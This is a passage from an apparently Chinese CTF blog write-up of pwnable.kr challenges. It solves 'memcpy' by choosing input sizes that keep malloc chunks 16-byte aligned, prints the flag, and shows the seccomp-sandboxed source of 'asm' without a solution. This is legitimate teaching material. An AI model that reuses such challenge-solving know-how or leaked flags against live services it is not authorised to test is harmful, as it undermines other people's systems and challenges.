<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// compiled with : gcc -o memcpy memcpy.c -m32 -lm</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="title">rdtsc</span><span class="params">()</span></span>{</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">"rdtsc"</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">slow_memcpy</span><span class="params">(<span class="keyword">char</span>* dest, <span class="keyword">const</span> <span class="keyword">char</span>* src, size_t len)</span></span>{</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;len; i++) {</span><br><span class="line">        dest[i] = src[i];</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> dest;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">fast_memcpy</span><span class="params">(<span class="keyword">char</span>* dest, <span class="keyword">const</span> <span class="keyword">char</span>* src, size_t len)</span></span>{</span><br><span class="line">    <span class="keyword">size_t</span> i;</span><br><span class="line">    <span class="comment">// 64-byte block fast copy</span></span><br><span class="line">    <span class="keyword">if</span>(len &gt;= <span class="number">64</span>){</span><br><span class="line">        i = len / <span class="number">64</span>;</span><br><span class="line">        len &amp;= (<span class="number">64</span>-<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">while</span>(i-- &gt; <span class="number">0</span>){</span><br><span class="line">            __asm__ __volatile__ (</span><br><span class="line">                <span class="string">"movdqa (%0), %%xmm0\n"</span></span><br><span class="line">                <span class="string">"movdqa 16(%0), %%xmm1\n"</span></span><br><span class="line">                <span class="string">"movdqa 32(%0), %%xmm2\n"</span></span><br><span class="line">                <span class="string">"movdqa 48(%0), %%xmm3\n"</span></span><br><span class="line">                <span class="string">"movntps %%xmm0, (%1)\n"</span></span><br><span class="line">                <span class="string">"movntps %%xmm1, 16(%1)\n"</span></span><br><span class="line">                <span class="string">"movntps %%xmm2, 32(%1)\n"</span></span><br><span class="line">                <span class="string">"movntps %%xmm3, 48(%1)\n"</span></span><br><span class="line">                ::<span class="string">"r"</span>(src),<span class="string">"r"</span>(dest):<span class="string">"memory"</span>);</span><br><span class="line">            dest += <span class="number">64</span>;</span><br><span class="line">            src += <span class="number">64</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">// byte-to-byte slow copy</span></span><br><span class="line">    <span class="keyword">if</span>(len) slow_memcpy(dest, src, len);</span><br><span class="line">    <span class="keyword">return</span> dest;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>{</span><br><span class="line"></span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, _IOLBF, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Hey, I have a boring assignment for CS class.. :(\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"The assignment is simple.\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-----------------------------------------------------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"- What is the best implementation of memcpy?        -\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"- 1. implement your own slow/fast version of memcpy -\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"- 2. compare them with various size of data         -\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"- 3. conclude your experiment and submit report     -\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-----------------------------------------------------\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"This time, just help me out with my experiment and get flag\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"No fancy hacking, I promise :D\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> t1, t2;</span><br><span class="line">    <span class="keyword">int</span> e;</span><br><span class="line">    <span class="keyword">char</span>* src;</span><br><span class="line">    <span class="keyword">char</span>* dest;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> low, high;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> size;</span><br><span class="line">    <span class="comment">// allocate memory</span></span><br><span class="line">    <span class="keyword">char</span>* cache1 = mmap(<span class="number">0</span>, <span class="number">0x4000</span>, <span class="number">7</span>, MAP_PRIVATE|MAP_ANONYMOUS, -<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">char</span>* cache2 = mmap(<span class="number">0</span>, <span class="number">0x4000</span>, <span class="number">7</span>, MAP_PRIVATE|MAP_ANONYMOUS, -<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    src = mmap(<span class="number">0</span>, <span class="number">0x2000</span>, <span class="number">7</span>, MAP_PRIVATE|MAP_ANONYMOUS, -<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> sizes[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// setup experiment parameters</span></span><br><span class="line">    <span class="keyword">for</span>(e=<span class="number">4</span>; e&lt;<span class="number">14</span>; e++){    <span class="comment">// 2^13 = 8K</span></span><br><span class="line">        low = <span class="built_in">pow</span>(<span class="number">2</span>,e-<span class="number">1</span>);</span><br><span class="line">        high = <span class="built_in">pow</span>(<span class="number">2</span>,e);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"specify the memcpy amount between %d ~ %d : "</span>, low, high);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;size);</span><br><span class="line">        <span class="keyword">if</span>( size &lt; low || size &gt; high ){</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"don't mess with the experiment.\n"</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        }</span><br><span class="line">        sizes[i++] = size;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"ok, lets run the experiment with your configuration\n"</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// run experiment</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">10</span>; i++){</span><br><span class="line">        size = sizes[i];</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"experiment %d : memcpy with buffer size %d\n"</span>, i+<span class="number">1</span>, size);</span><br><span class="line">        dest = <span class="built_in">malloc</span>( size );</span><br><span class="line"></span><br><span class="line">        <span class="built_in">memcpy</span>(cache1, cache2, <span class="number">0x4000</span>);     <span class="comment">// to eliminate cache effect</span></span><br><span class="line">        t1 = rdtsc();</span><br><span class="line">        slow_memcpy(dest, src, size);       <span class="comment">// byte-to-byte memcpy</span></span><br><span class="line">        t2 = rdtsc();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"ellapsed CPU cycles for slow_memcpy : %llu\n"</span>, t2-t1);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">memcpy</span>(cache1, cache2, <span class="number">0x4000</span>);     <span class="comment">// to eliminate cache effect</span></span><br><span class="line">        t1 = rdtsc();</span><br><span class="line">        fast_memcpy(dest, src, size);       <span class="comment">// block-to-block memcpy</span></span><br><span class="line">        t2 = rdtsc();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"ellapsed CPU cycles for fast_memcpy : %llu\n"</span>, t2-t1);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"thanks for helping my experiment!\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"flag : ----- erased in this source code -----\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
</div>

<p>
读了一遍源码, 好像真的是送分题&#x2026;
</p>

<p>
试了一下, 每次都输入 high-1 , 结果执行了4次以后就没执行了, 大概是挂掉了,
果然没有这么好的事情&#x2026;
</p>



<p>
但是在自己电脑上编译运行了一下, 又能成功, 非常的迷.
</p>

<p>
折腾半天愣是没弄懂为啥
</p>


<p>
无奈Google writeup, 发现里面提到在本地编译执行会看到 segmentation fault,
我看了看自己2.26的libc, 仿佛明白了什么&#x2026;
</p>


<p>
果然换成2.23就出现 segmentation fault 了!&#x2026;
</p>


<p>
gdb调试, 定位到段错误的地方
</p>

<div class="org-src-container">

<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#9658; 0x5655584c &#60;fast_memcpy+62&#62;    movntps xmmword ptr [edx], xmm0&#10;  0x5655584f &#60;fast_memcpy+65&#62;    movntps xmmword ptr [edx + 0x10], xmm1&#10;  0x56555853 &#60;fast_memcpy+69&#62;    movntps xmmword ptr [edx + 0x20], xmm2</span><br></pre></td></tr></table></figure>
</div>

<p>
Google movntps指令, 发现了在保护模式下可能出现的几种异常
<a href="http://www.jaist.ac.jp/iscenter-new/mpc/altix/altixdata/opt/intel/vtune/doc/users_guide/mergedProjects/analyzer_ec/mergedProjects/reference_olh/mergedProjects/instructions/instruct32_hh/vc197.htm" target="_blank" rel="noopener">MOVNTPS&#x2013;Move Aligned Four Packed Single-FP Non Temporal</a>
</p>


<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col class="left">

<col class="left">
</colgroup>
<tbody>
<tr>
<td class="left">#GP(0)</td>
<td class="left">For an illegal memory operand effective address in the CS, DS, ES, FS or GS segments. If memory operand is not aligned on a 16-byte boundary, regardless of segment.</td>
</tr>

<tr>
<td class="left">#SS(0)</td>
<td class="left">For an illegal address in the SS segment.</td>
</tr>

<tr>
<td class="left">#PF(fault-code)</td>
<td class="left">For a page fault.</td>
</tr>

<tr>
<td class="left">#NM</td>
<td class="left">If TS in CR0 is set</td>
</tr>

<tr>
<td class="left">#UD</td>
<td class="left">If EM in CR0 is set. If OSFXSR in CR4 is 0. If CPUID feature flag SSE is 0.</td>
</tr>
</tbody>
</table>


<div class="org-src-container">

<figure class="highlight"><table><tr><td class="code"><pre><span class="line">pwndbg&#62; i registers edx&#10;edx            0x565594a8    1448449192</span><br></pre></td></tr></table></figure>
</div>

<p>
查看edx的值, 发现没有对齐, 这大概就是产生段错误的原因了
</p>

<p>
查看源代码, 知道这个地方是dest的地址(果然还是看不惯AT&amp;T&#x2026;
</p>

<div class="org-src-container">

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">__asm__ __volatile__ (</span><br><span class="line">    <span class="string">"movdqa (%0), %%xmm0\n"</span></span><br><span class="line">    <span class="string">"movdqa 16(%0), %%xmm1\n"</span></span><br><span class="line">    <span class="string">"movdqa 32(%0), %%xmm2\n"</span></span><br><span class="line">    <span class="string">"movdqa 48(%0), %%xmm3\n"</span></span><br><span class="line">    <span class="string">"movntps %%xmm0, (%1)\n"</span></span><br><span class="line">    <span class="string">"movntps %%xmm1, 16(%1)\n"</span></span><br><span class="line">    <span class="string">"movntps %%xmm2, 32(%1)\n"</span></span><br><span class="line">    <span class="string">"movntps %%xmm3, 48(%1)\n"</span></span><br><span class="line">    ::<span class="string">"r"</span>(src),<span class="string">"r"</span>(dest):<span class="string">"memory"</span>);</span><br></pre></td></tr></table></figure>
</div>


<p>
查看malloc的相关实现(<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/heap/heap_structure/#_3" target="_blank" rel="noopener">堆相关数据结构</a>)
</p>

<p>
可以看到 malloc 每次申请一个 chunk, 由于存在空间复用及对齐, chunk的大小为 <code>ceil((size + (2 - 1) * SIZE_SZ) / (2 * SIZE_S))) * 2 * SIZE_S</code>
</p>

<p>
32位系统上SIZE_S为4
</p>

<pre class="example">
chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |             Size of previous chunk, if unallocated (P clear)  |
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |             Size of chunk, in bytes                     |A|M|P|
  mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |             User data starts here...                          .
        .                                                               .
        .             (malloc_usable_size() bytes)                      .
next    .                                                               |
chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |             (size of chunk, but used for application data)    |
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        |             Size of next chunk, in bytes                |A|0|1|
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
</pre>


<p>
直接通过以下脚本可以跑出一组数据
</p>

<div class="org-src-container">

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">can = [i <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>, <span class="number">8192</span> + <span class="number">1</span>) <span class="keyword">if</span> (ceil((i + <span class="number">4</span>) / <span class="number">8</span>) * <span class="number">8</span>) % <span class="number">16</span> == <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">4</span>, <span class="number">14</span>):</span><br><span class="line">    num = [i <span class="keyword">for</span> i <span class="keyword">in</span> can <span class="keyword">if</span> pow(<span class="number">2</span>, _ - <span class="number">1</span>) &lt;= i &lt;= pow(<span class="number">2</span>, _)]</span><br><span class="line">    print(num[<span class="number">0</span>])</span><br></pre></td></tr></table></figure>
</div>

<p>
如
</p>

<pre class="example">
8
21
37
69
133
261
517
1029
2053
4101
</pre>

<p>
输入, 得到flag
</p>

<p>
flag: <code>1_w4nn4_br34K_th3_m3m0ry_4lignm3nt</code>
</p>
</div>
</div>
</div>

<div id="outline-container-sec-18" class="outline-2">
<h2 id="sec-18">asm</h2>
<div class="outline-text-2" id="text-18">
</div><div id="outline-container-sec-18-1" class="outline-3">
<h3 id="sec-18-1">简介</h3>
<div class="outline-text-3" id="text-18-1">
<pre class="example">
Mommy! I think I know how to make shellcodes

ssh asm@pwnable.kr -p2222 (pw: guest)
</pre>
</div>
</div>

<div id="outline-container-sec-18-2" class="outline-3">
<h3 id="sec-18-2">分析</h3>
<div class="outline-text-3" id="text-18-2">
<pre class="example">
asm@ubuntu:~$ ls -l
total 28
-rwxr-xr-x 1 root root 13704 Nov 29  2016 asm
-rw-r--r-- 1 root root  1793 Nov 29  2016 asm.c
-rw-r--r-- 1 root root   211 Nov 19  2016 readme
-rw-r--r-- 1 root root    67 Nov 19  2016 this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong
</pre>

<p>
readme
</p>

<pre class="example">
once you connect to port 9026, the "asm" binary will be executed under asm_pwn privilege.
make connection to challenge (nc 0 9026) then get the flag. (file name of the flag is same as the one in this directory)
</pre>

<p>
asm.c
</p>

<div class="org-src-container">

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;seccomp.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> LENGTH <span class="number">128</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sandbox</span><span class="params">()</span></span>{</span><br><span class="line">    scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);</span><br><span class="line">    <span class="keyword">if</span> (ctx == <span class="literal">NULL</span>) {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"seccomp error\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), <span class="number">0</span>);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), <span class="number">0</span>);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), <span class="number">0</span>);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(<span class="built_in">exit</span>), <span class="number">0</span>);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (seccomp_load(ctx) &lt; <span class="number">0</span>){</span><br><span class="line">        seccomp_release(ctx);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"seccomp error\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    }</span><br><span class="line">    seccomp_release(ctx);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> stub[] = <span class="string">"\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff"</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> filter[<span class="number">256</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>{</span><br><span class="line"></span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, _IOLBF, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Welcome to shellcoding practice challenge.\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"In this challenge, you can run your x64 shellcode under SECCOMP sandbox.\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Try to make shellcode that spits flag using open()/read()/write() systemcalls only.\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"If this does not challenge you. you should play 'asg' challenge :)\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span>* sh = (<span class="keyword">char</span>*)mmap(<span class="number">0x41414000</span>, <span class="number">0x1000</span>, <span class="number">7</span>, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">memset</span>(sh, <span class="number">0x90</span>, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(sh, stub, <span class="built_in">strlen</span>(stub));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> offset = <span class="keyword">sizeof</span>(stub);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"give me your x64 shellcode: "</span>);</span><br><span class="line">    read(<span class="number">0</span>, sh+offset, <span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">    alarm(<span class="number">10</span>);</span><br><span class="line">    chroot(<span class="string">"/home/asm_pwn"</span>);    <span class="comment">// you are in chroot jail. so you can't use symlink in /tmp</span></span><br><span class="line">    sandbox();</span><br><span class="line">    ((<span class="keyword">void</span> (*)(<span class="keyword">void</span>))sh)();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
</div>
</div>
</div>
</div>

Last Updated 2018-05-08 二 09:12.<br>Render by <a href="https://github.com/CodeFalling/hexo-renderer-org" target="_blank" rel="noopener">hexo-renderer-org</a> with <a href="http://www.gnu.org/software/emacs/" target="_blank" rel="noopener">Emacs</a> 25.3.1 (<a href="http://orgmode.org" target="_blank" rel="noopener">Org</a> mode 8.2.10)

      
    </div>
    <footer class="article-footer">
      <a data-url="https://yintianliang.github.io/2018/05/04/pwnable.kr_Toddler's Bottle/" data-id="cjgx6lzwe0008azwjzkzfq9pi" class="article-share-link">分享</a>
      
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwnable-kr/">pwnable.kr</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/">writeup</a></li></ul>

    </footer>
  </div>
  
    
 <script src="/jquery/jquery.min.js"></script>
  <div id="random_posts">
    <h2>推荐文章</h2>
    <div class="random_posts_ul">
      <script>
          var random_count =4
          var site = {BASE_URI:'/'};
          function load_random_posts(obj) {
              var arr=site.posts;
              if (!obj) return;
              // var count = $(obj).attr('data-count') || 6;
              for (var i, tmp, n = arr.length; n; i = Math.floor(Math.random() * n), tmp = arr[--n], arr[n] = arr[i], arr[i] = tmp);
              arr = arr.slice(0, random_count);
              var html = '<ul>';
            
              for(var j=0;j<arr.length;j++){
                var item=arr[j];
                html += '<li><strong>' + 
                item.date + ':&nbsp;&nbsp;<a href="' + (site.BASE_URI+item.uri) + '">' + 
                (item.title || item.uri) + '</a></strong>';
                if(item.excerpt){
                  html +='<div class="post-excerpt">'+item.excerpt+'</div>';
                }
                html +='</li>';
                
              }
              $(obj).html(html + '</ul>');
          }
          $('.random_posts_ul').each(function () {
              var c = this;
              if (!site.posts || !site.posts.length){
                  $.getJSON(site.BASE_URI + 'js/posts.js',function(json){site.posts = json;load_random_posts(c)});
              } 
               else{
                load_random_posts(c);
              }
          });
      </script>
    </div>
  </div>

    
<nav id="article-nav">
  
    <a href="/2018/05/07/improve_hexo_table/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">上一篇</strong>
      <div class="article-nav-title">
        
          改进hexo/cafe主题表格显示效果
        
      </div>
    </a>
  
  
    <a href="/2017/12/26/pip_fail_to_install_pwntools/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">下一篇</strong>
      <div class="article-nav-title">pip安装pwntools时卡住</div>
    </a>
  
</nav>

  
</article>
 
     
  <div class="comments" id="comments">
    
     
       
      <div id="cloud-tie-wrapper" class="cloud-tie-wrapper"></div>
    
       
      
      
  </div>
 
  

</section>
           
    <aside id="sidebar">
  
    

  
    
    <div class="widget-wrap">
    
      <div class="widget" id="toc-widget-fixed">
      
        <strong class="toc-title">文章目录</strong>
        <div class="toc-widget-list">
